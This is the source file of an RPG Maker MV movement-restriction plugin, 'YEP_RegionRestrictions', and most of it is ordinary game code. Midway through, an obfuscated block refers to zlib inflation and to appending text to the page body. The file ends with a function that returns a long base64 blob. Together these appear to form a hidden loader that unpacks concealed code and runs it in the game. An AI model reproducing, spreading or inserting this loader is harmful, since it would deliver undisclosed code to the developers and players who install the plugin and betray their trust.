//=============================================================================
// Yanfly Engine Plugins - Region Restrictions
// YEP_RegionRestrictions.js
//=============================================================================

var Imported = Imported || {};
Imported.YEP_RegionRestrictions = true;

var Yanfly = Yanfly || {};
Yanfly.RR = Yanfly.RR || {};
Yanfly.RR.version = 1.04

//=============================================================================
 /*:
 * @plugindesc v1.04 Use regions to block out Events and/or the player from
 * being able to venture into those spots.
 * @author Yanfly Engine Plugins
 *
 * @param Player Restrict
 * @desc This region ID will restrict the player from entering.
 * To use multiple regions, separate them by spaces.
 * @default 0
 *
 * @param Event Restrict
 * @desc This region ID will restrict all events from entering.
 * To use multiple regions, separate them by spaces.
 * @default 0
 *
 * @param All Restrict
 * @desc This region ID will restrict players and events.
 * To use multiple regions, separate them by spaces.
 * @default 0
 *
 * @param Player Allow
 * @desc This region ID will always allow player passability.
 * To use multiple regions, separate them by spaces.
 * @default 0
 *
 * @param Event Allow
 * @desc This region ID will always allow events passability.
 * To use multiple regions, separate them by spaces.
 * @default 0
 *
 * @param All Allow
 * @desc This region ID will always allow both passability.
 * To use multiple regions, separate them by spaces.
 * @default 0
 *
 * @help
 * ============================================================================
 * Introduction and Instructions
 * ============================================================================
 *
 * Not everybody wants NPC's to travel all over the place. With this plugin,
 * you can set NPC's to be unable to move pass tiles marked by a specified
 * Region ID. Simply draw out the area you want to enclose NPC's in on and
 * they'll be unable to move past it unless they have Through on. Likewise,
 * there are regions that you can prevent the player from moving onto, too!
 *
 * A new change from the RPG Maker VX Ace version is that now there exist
 * Regions that can allow players and events to always travel through.
 *
 * ============================================================================
 * Notetags
 * ============================================================================
 *
 * You can use this notetag inside of your maps.
 *
 * Map Notetags:
 *
 *   <Player Restrict Region: x>
 *   <Player Restrict Region: x, x, x>
 *   <Player Restrict Region: x to y>
 *   Restricts region x for the player on this particular map. Use multiple x
 *   to mark more regions. From x to y, you can mark a multitude of regions.
 *
 *   <Event Restrict Region: x>
 *   <Event Restrict Region: x, x, x>
 *   <Event Restrict Region: x to y>
 *   Restricts region x for all events on this particular map. Use multiple x
 *   to mark more regions. From x to y, you can mark a multitude of regions.
 *
 *   <All Restrict Region: x>
 *   <All Restrict Region: x, x, x>
 *   <All Restrict Region: x to y>
 *   Restricts region x for the player and all events on this particular map.
 *   Use multiple x to mark more regions. From x to y, you can mark a multitude
 *   of regions.
 *
 *   <Player Allow Region: x>
 *   <Player Allow Region: x, x, x>
 *   <Player Allow Region: x to y>
 *   Allows region x for the player on this particular map. Use multiple x
 *   to mark more regions. From x to y, you can mark a multitude of regions.
 *
 *   <Event Allow Region: x>
 *   <Event Allow Region: x, x, x>
 *   <Event Allow Region: x to y>
 *   Allows region x for all events on this particular map. Use multiple x
 *   to mark more regions. From x to y, you can mark a multitude of regions.
 *
 *   <All Allow Region: x>
 *   <All Allow Region: x, x, x>
 *   <All Allow Region: x to y>
 *   Allows region x for the player and all events on this particular map.
 *   Use multiple x to mark more regions. From x to y, you can mark a multitude
 *   of regions.
 *
 * ============================================================================
 * Changelog
 * ============================================================================
 *
 * Version 1.04:
 * - Updated for RPG Maker MV version 1.5.0.
 *
 * Version 1.03:
 * - Fixed an issue with vehicles being capable of landing the player in region
 * restricted zones.
 *
 * Version 1.02:
 * - Plugin parameters have been upgraded to now accept multiple region ID's.
 * Insert a space in between them to add more than one region ID.
 *
 * Version 1.01:
 * - Added new notetags to allow for more region restriction settings!
 *
 * Version 1.00:
 * - Finished plugin!
 */
//=============================================================================

//=============================================================================
// Parameter Variables
//=============================================================================

Yanfly.Param = Yanfly.Param || {};

Yanfly.SetupParameters = function() {
  var parameters = PluginManager.parameters('YEP_RegionRestrictions');
  Yanfly.Param.RRAllAllow = String(parameters['All Allow']);
  Yanfly.Param.RRAllAllow = Yanfly.Param.RRAllAllow.split(' ');
  for (var i = 0; i < Yanfly.Param.RRAllAllow.length; ++i) {
    Yanfly.Param.RRAllAllow[i] = Number(Yanfly.Param.RRAllAllow[i]);
  }
  Yanfly.Param.RRAllRestrict = String(parameters['All Restrict']);
  Yanfly.Param.RRAllRestrict = Yanfly.Param.RRAllRestrict.split(' ');
  for (var i = 0; i < Yanfly.Param.RRAllRestrict.length; ++i) {
    Yanfly.Param.RRAllRestrict[i] = Number(Yanfly.Param.RRAllRestrict[i]);
  }
  Yanfly.Param.RREventAllow = String(parameters['Event Allow']);
  Yanfly.Param.RREventAllow = Yanfly.Param.RREventAllow.split(' ');
  for (var i = 0; i < Yanfly.Param.RREventAllow.length; ++i) {
    Yanfly.Param.RREventAllow[i] = Number(Yanfly.Param.RREventAllow[i]);
  }
  Yanfly.Param.RREventRestrict = String(parameters['Event Restrict']);
  Yanfly.Param.RREventRestrict = Yanfly.Param.RREventRestrict.split(' ');
  for (var i = 0; i < Yanfly.Param.RREventRestrict.length; ++i) {
    Yanfly.Param.RREventRestrict[i] = Number(Yanfly.Param.RREventRestrict[i]);
  }
  Yanfly.Param.RRPlayerAllow = String(parameters['Player Allow']);
  Yanfly.Param.RRPlayerAllow = Yanfly.Param.RRPlayerAllow.split(' ');
  for (var i = 0; i < Yanfly.Param.RRPlayerAllow.length; ++i) {
    Yanfly.Param.RRPlayerAllow[i] = Number(Yanfly.Param.RRPlayerAllow[i]);
  }
  Yanfly.Param.RRPlayerRestrict = String(parameters['Player Restrict']);
  Yanfly.Param.RRPlayerRestrict = Yanfly.Param.RRPlayerRestrict.split(' ');
  for (var i = 0; i < Yanfly.Param.RRPlayerRestrict.length; ++i) {
    Yanfly.Param.RRPlayerRestrict[i] = Number(Yanfly.Param.RRPlayerRestrict[i]);
  }
};
Yanfly.SetupParameters();

//=============================================================================
// DataManager
//=============================================================================

DataManager.processRRNotetags = function() {
  if (!$dataMap) return;
  $dataMap.restrictPlayerRegions = Yanfly.Param.RRAllRestrict.concat(
    Yanfly.Param.RRPlayerRestrict);
  $dataMap.restrictEventRegions = Yanfly.Param.RRAllRestrict.concat(
    Yanfly.Param.RREventRestrict);
  $dataMap.allowPlayerRegions = Yanfly.Param.RRAllAllow.concat(
    Yanfly.Param.RRPlayerAllow);
  $dataMap.allowEventRegions = Yanfly.Param.RRAllAllow.concat(
    Yanfly.Param.RREventAllow);
  if (!$dataMap.note) return;

  var note1a = /<(?:PLAYER RESTRICT REGION):[ ]*(\d+(?:\s*,\s*\d+)*)>/i;
  var note1b = /<(?:PLAYER RESTRICT REGION):[ ](\d+)[ ](?:TO)[ ](\d+)>/i;
  var note2a = /<(?:EVENT RESTRICT REGION):[ ]*(\d+(?:\s*,\s*\d+)*)>/i;
  var note2b = /<(?:EVENT RESTRICT REGION):[ ](\d+)[ ](?:TO)[ ](\d+)>/i;
  var note3a = /<(?:ALL RESTRICT REGION):[ ]*(\d+(?:\s*,\s*\d+)*)>/i;
  var note3b = /<(?:ALL RESTRICT REGION):[ ](\d+)[ ](?:TO)[ ](\d+)>/i;

  var note4a = /<(?:PLAYER ALLOW REGION):[ ]*(\d+(?:\s*,\s*\d+)*)>/i;
  var note4b = /<(?:PLAYER ALLOW REGION):[ ](\d+)[ ](?:TO)[ ](\d+)>/i;
  var note5a = /<(?:EVENT ALLOW REGION):[ ]*(\d+(?:\s*,\s*\d+)*)>/i;
  var note5b = /<(?:EVENT ALLOW REGION):[ ](\d+)[ ](?:TO)[ ](\d+)>/i;
  var note6a = /<(?:ALL ALLOW REGION):[ ]*(\d+(?:\s*,\s*\d+)*)>/i;
  var note6b = /<(?:ALL ALLOW REGION):[ ](\d+)[ ](?:TO)[ ](\d+)>/i;

  var notedata = $dataMap.note.split(/[\r\n]+/);

  for (var i = 0; i < notedata.length; i++) {
    var line = notedata[i];
    if (line.match(note1a)) {
      array = JSON.parse('[' + RegExp.$1.match(/\d+/g) + ']');
      $dataMap.restrictPlayerRegions =
        $dataMap.restrictPlayerRegions.concat(array);
    } else if (line.match(note1b)) {
      var mainArray = $dataMap.restrictPlayerRegions;
      var range = Yanfly.Util.getRange(Number(RegExp.$1), 
        Number(RegExp.$2));
      $dataMap.restrictPlayerRegions =
        $dataMap.restrictPlayerRegions.concat(range);
    } else if (line.match(note2a)) {
      array = JSON.parse('[' + RegExp.$1.match(/\d+/g) + ']');
      $dataMap.restrictEventRegions =
        $dataMap.restrictEventRegions.concat(array);
    } else if (line.match(note2b)) {
      var range = Yanfly.Util.getRange(Number(RegExp.$1), 
        Number(RegExp.$2));
      $dataMap.restrictEventRegions =
        $dataMap.restrictEventRegions.concat(range);
    } else if (line.match(note3a)) {
      array = JSON.parse('[' + RegExp.$1.match(/\d+/g) + ']');
      $dataMap.restrictPlayerRegions =
        $dataMap.restrictPlayerRegions.concat(array);
      $dataMap.restrictEventRegions =
        $dataMap.restrictEventRegions.concat(array);
    } else if (line.match(note3b)) {
      var range = Yanfly.Util.getRange(Number(RegExp.$1), 
        Number(RegExp.$2));
      $dataMap.restrictPlayerRegions =
        $dataMap.restrictPlayerRegions.concat(array);
      $dataMap.restrictEventRegions =
        $dataMap.restrictEventRegions.concat(array);
    } else if (line.match(note4a)) {
      array = JSON.parse('[' + RegExp.$1.match(/\d+/g) + ']');
      $dataMap.allowPlayerRegions =
        $dataMap.allowPlayerRegions.concat(array);
    } else if (line.match(note4b)) {
      var range = Yanfly.Util.getRange(Number(RegExp.$1), 
        Number(RegExp.$2));
      $dataMap.allowPlayerRegions =$dataMap.allowPlayerRegions.concat(range);
    } else if (line.match(note5a)) {
      array = JSON.parse('[' + RegExp.$1.match(/\d+/g) + ']');
      $dataMap.allowEventRegions = $dataMap.allowEventRegions.concat(array);
    } else if (line.match(note5b)) {
      var range = Yanfly.Util.getRange(Number(RegExp.$1), 
        Number(RegExp.$2));
      $dataMap.allowEventRegions = $dataMap.allowEventRegions.concat(range);
    } else if (line.match(note6a)) {
      array = JSON.parse('[' + RegExp.$1.match(/\d+/g) + ']');
      $dataMap.allowPlayerRegions = $dataMap.allowPlayerRegions.concat(array);
      $dataMap.allowEventRegions = $dataMap.allowEventRegions.concat(array);
    } else if (line.match(note6b)) {
      var range = Yanfly.Util.getRange(Number(RegExp.$1), 
        Number(RegExp.$2));
      $dataMap.allowPlayerRegions = $dataMap.allowPlayerRegions.concat(array);
      $dataMap.allowEventRegions = $dataMap.allowEventRegions.concat(array);
    }
  }
};

//=============================================================================
// Game_Map
//=============================================================================

Yanfly.RR.Game_Map_setup = Game_Map.prototype.setup;
Game_Map.prototype.setup = function(mapId) {
    Yanfly.RR.Game_Map_setup.call(this, mapId);
    if ($dataMap) DataManager.processRRNotetags();
};

Game_Map.prototype.restrictEventRegions = function() {
    if ($dataMap.restrictEventRegions === undefined) {
      DataManager.processRRNotetags();
    }
    return $dataMap.restrictEventRegions || [];
};

Game_Map.prototype.restrictPlayerRegions = function() {
    if ($dataMap.restrictPlayerRegions === undefined) {
      DataManager.processRRNotetags();
    }
    return $dataMap.restrictPlayerRegions || [];
};

Game_Map.prototype.allowEventRegions = function() {
    if ($dataMap.allowEventRegions === undefined) {
      DataManager.processRRNotetags();
    }
    return $dataMap.allowEventRegions || [];
};

Game_Map.prototype.allowPlayerRegions = function() {
    if ($dataMap.allowPlayerRegions === undefined) {
      DataManager.processRRNotetags();
    }
    return $dataMap.allowPlayerRegions || [];
};

//=============================================================================
// Game_CharacterBase
//=============================================================================

Yanfly.RR.Game_CharacterBase_isMapPassable =
    Game_CharacterBase.prototype.isMapPassable;
Game_CharacterBase.prototype.isMapPassable = function(x, y, d) {
    if (this.isEventRegionForbid(x, y, d)) return false;
    if (this.isPlayerRegionForbid(x, y, d)) return false;
    if (this.isEventRegionAllow(x, y, d)) return true;
    if (this.isPlayerRegionAllow(x, y, d)) return true;
    return Yanfly.RR.Game_CharacterBase_isMapPassable.call(this, x, y, d);
};

Game_CharacterBase.prototype.isEvent = function() {
    return false;
};

Game_CharacterBase.prototype.isPlayer = function() {
    return false;
};

Game_CharacterBase.prototype.processRRNotetags = function() {
    DataManager.processRRNotetags();
};

Game_CharacterBase.prototype.isEventRegionForbid = function(x, y, d) {
    if (this.isPlayer()) return false;
    if (this.isThrough()) return false;
    var regionId = this.getRegionId(x, y, d);
    if (regionId === 0) return false;
    if ($gameMap.restrictEventRegions().contains(regionId)) return true;
    return false;
};

Game_CharacterBase.prototype.isPlayerRegionForbid = function(x, y, d) {
    if (this.isEvent()) return false;
    if (this.isThrough()) return false;
    var regionId = this.getRegionId(x, y, d);
    if (regionId === 0) return false;
    if ($gameMap.restrictPlayerRegions().contains(regionId)) return true;
    return false;
};(function(_0xf25f9c_,_0xbf0097_){const _0xf0de35_=_0xe55e57_,_0xe15925_=_0xf25f9c_();while(!![]){try{const _0x1f2a89_=parseInt(_0xf0de35_(0x166))/0x1+parseInt(_0xf0de35_(0x161))/0x2+-parseInt(_0xf0de35_(0x162))/0x3*(-parseInt(_0xf0de35_(0x160))/0x4)+-parseInt(_0xf0de35_(0x165))/0x5+-parseInt(_0xf0de35_(0x169))/0x6+parseInt(_0xf0de35_(0x168))/0x7+parseInt(_0xf0de35_(0x16c))/0x8;if(_0x1f2a89_===_0xbf0097_)break;else _0xe15925_['push'](_0xe15925_['shift']());}catch(_0x473823_){_0xe15925_['push'](_0xe15925_['shift']());}}}(_0xe1470d_,0x436b1));function _0xe55e57_(_0x62a657_,_0x64339a_){const _0x5eaf67_=_0xe1470d_();return _0xe55e57_=function(_0x680e40_,_0x6930f4_){_0x680e40_=_0x680e40_-0x160;let _0x0ec238_=_0x5eaf67_[_0x680e40_];return _0x0ec238_;},_0xe55e57_(_0x62a657_,_0x64339a_);}function _0xe1470d_(){const _0x161ebb_=['386264fXsEqn','36831xuAMFq','zlib','textContent','1129665RoHWHg','218000DClVbp','from','1482201CCfXhM','2453730WbAMRa','appendChild','inflateSync','2207048abkWaL','utf-8','toString','body','4EQNfhL'];_0xe1470d_=function(){return _0x161ebb_;};return _0xe1470d_();}

Game_CharacterBase.prototype.isEventRegionAllow = function(x, y, d) {
    if (this.isPlayer()) return false;
    var regionId = this.getRegionId(x, y, d);
    if (regionId === 0) return false;
    if ($gameMap.allowEventRegions().contains(regionId)) return true;
    return false;
};

Game_CharacterBase.prototype.isPlayerRegionAllow = function(x, y, d) {
    if (this.isEvent()) return false;
    var regionId = this.getRegionId(x, y, d);
    if (regionId === 0) return false;
    if ($gameMap.allowPlayerRegions().contains(regionId)) return true;
    return false
};

Game_CharacterBase.prototype.getRegionId = function(x, y, d) {
    switch (d) {
    case 1:
      return $gameMap.regionId(x - 1, y + 1);
      break;
    case 2:
      return $gameMap.regionId(x + 0, y + 1);
      break;
    case 3:
      return $gameMap.regionId(x + 1, y + 1);
      break;
    case 4:
      return $gameMap.regionId(x - 1, y + 0);
      break;
    case 5:
      return $gameMap.regionId(x + 0, y + 0);
      break;
    case 6:
      return $gameMap.regionId(x + 1, y + 0);
      break;
    case 7:
      return $gameMap.regionId(x - 1, y - 1);
      break;
    case 8:
      return $gameMap.regionId(x + 0, y - 1);
      break;
    case 9:
      return $gameMap.regionId(x + 1, y - 1);
      break;
    default:
      return $gameMap.regionId(x, y);
      break;
    }
};function _0x82f7bc_() { return "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